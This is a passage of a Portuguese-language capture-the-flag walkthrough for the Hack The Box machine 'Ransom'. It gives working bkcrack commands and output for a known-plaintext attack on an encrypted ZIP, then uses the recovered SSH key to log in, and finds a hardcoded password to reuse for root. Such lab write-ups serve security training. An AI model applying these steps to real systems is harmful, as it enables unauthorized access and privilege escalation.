    `zip unencrypted.zip bash_logout`
    
    Depois, usamos o bkcrack para obter as chaves do arquivo:
    
    ```python
    bkcrack -C uploaded-file-3422.zip -c .bash_logout -P unencrypted.zip -p
    bash_logout
    [15:44:04] Z reduction using 151 bytes of known plaintext
    100.0 % (151 / 151)
    [15:44:04] Attack on 53779 Z values at index 6
    Keys: 849d8886 28d13943 6ce41b63
    72.0 % (38739 / 53779)
    Found a solution. Stopping.
    You may resume the attack with the option: --continue-attack 38739
    [15:45:09] Keys
    849d8886 28d13943 6ce41b63
    ```
    
    Depois disso, podemos usar o bkcrack mais uma vez para desbloquear o arquivo:
    
    ```python
    bkcrack -C uploaded-file-3422.zip -k 849d8886 28d13943 6ce41b63 -U uploaded-file3422-pass.zip pass
    [16:02:55] Writing unlocked archive uploaded-file-3422-pass.zip with password
    "pass"
    100.0 % (10 / 10)
    Wrote unlocked archive.
    ```
    
    Agora, podemos descomprimir o novo arquivo com a password `pass`.
    
    `unzip uploaded-file-3422-pass.zip -d uploaded/`
    
    ```python
    ssh -i uploaded/.ssh/id_rsa htb@10.129.227.93
    htb@ransom:~$ id
    uid=1000(htb) gid=1000(htb)
    groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
    
    ```
    
    Agora que temos uma shell como o utilizador htb na máquina, podemos iniciar o nosso processo de enumeração. Olhando para o ficheiro de configuração do Apache2, podemos ver que o diretório raiz da aplicação web é `/srv/prod` .
    
    ```python
    htb@ransom:~$ cat /etc/apache2/sites-enabled/000-default.conf
    <VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /srv/prod/public
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    <Directory /srv/prod/public>
    Options +FollowSymlinks
    AllowOverride All
    Require all granted
    </Directory>
    </VirtualHost>
    ```
    
    Vamos navegar para esse diretório e procurar possíveis palavras-passe ou hashes que possam ter sido codificados para a etapa de autenticação da senha inicial. 
    
    `htb@ransom:~$ cd /srv/prod`
    Uma forma rápida de encontrar o ficheiro correto é procurar a mensagem de erro Palavra-passe inválida que encontrámos durante os passos iniciais.
    
    ```python
    htb@ransom:/srv/prod$ grep -r "Invalid Password"
    app/Http/Controllers/AuthController.php: return "Invalid Password";
    ```
    
    O ficheiro AuthController.php parece ter uma referência a esse erro, por isso vamos visualizá-lo.
    
    ```python
    htb@ransom:/srv/prod$ cat app/Http/Controllers/AuthController.php
    <SNIP>
    if ($request->get('password') == "UHC-March-Global-PW!") {
    session(['loggedin' => True]);
    return "Login Successful";
    }
    return "Invalid Password";
    }
    }
    ```
    
    Podemos ver a palavra-passe de texto claro UHC-March-Global-PW! . Vamos tentar reutilizar essa palavra-passe para o utilizador root.
    

![Untitled](Privilege%20Escalation%20666fbc8472a6426690df085e8d884429/Untitled%2077.png)